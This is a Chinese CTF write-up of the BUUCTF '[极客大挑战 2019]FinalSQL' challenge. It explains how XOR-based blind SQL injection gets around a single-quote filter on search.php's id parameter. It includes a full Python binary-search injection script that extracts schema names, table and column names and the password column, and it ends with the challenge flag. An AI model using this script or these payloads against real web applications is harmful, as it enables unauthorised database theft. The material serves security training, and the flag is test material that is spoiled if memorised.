# [极客大挑战 2019]FinalSQL

[题目地址](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]FinalSQL)

网站给了登录框和几个可以点的选项。登录框试了一下，直接把单引号过滤了，简单粗暴。几个可点的选项自然也没有东西，不过第五个提示了url的id参数有问题。

- You are too naive!How can I give it to you? So,why not take a look at the sixth one?But where is it?

把id改为6就能看见别的东西了，肯定不会是flag，都final了怎么可能这么简单。在id处尝试注入，然而同样也把单引号过滤了。常规直接爆值的肯定是不行了，最重要的闭合符号没了。看看[wp](https://blog.csdn.net/weixin_44214568/article/details/124047431)，原来是异或盲注，之前没见过的类型。

- http://41ec872a-4766-4225-820f-ceab0bfb17ee.node4.buuoj.cn:81/search.php?id=1^1

此时页面会返回错误信息，因为1异或1是0，这个网站遇见1-6 id之外的就会报错。`1^0`就正常了，结果是1，返回1号页面的东西。借鉴布尔盲注的思路，让要爆的值以布尔形式返回，然后异或两个1，比如`1^result^1`。如果result是1，回显正常，代表当前测试数据正确；如果不正常就代表不正确。借用大佬的脚本，即使用了二分法也跑了好一会。

```python
import requests
url = "http://41ec872a-4766-4225-820f-ceab0bfb17ee.node4.buuoj.cn:81/search.php"
flag = ''
def payload(i, j):
    # 数据库名字
    #sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1"%(i,j)
    # 表名
    # sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)^1"%(i,j)
    # 列名
    # sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1"%(i,j)
    # 查询flag
    sql = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" % (i, j)
    data = {"id": sql}
    r = requests.get(url, params=data)
    # print (r.url)
    if "Click" in r.text:
       res = 1
    else:
       res = 0
    return res
def exp():
    global flag
    for i in range(1, 10000):
        low = 31
        high = 127
        while low <= high:
              mid = (low + high) // 2
              res = payload(i, mid)
              if res:
                 low = mid + 1
              else:
                 high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
           break
        flag += chr(f)
exp()
print('flag=', flag)
```

## Flag
> flag{de2fc56e-c92f-4bf4-84ee-880087f1fab9}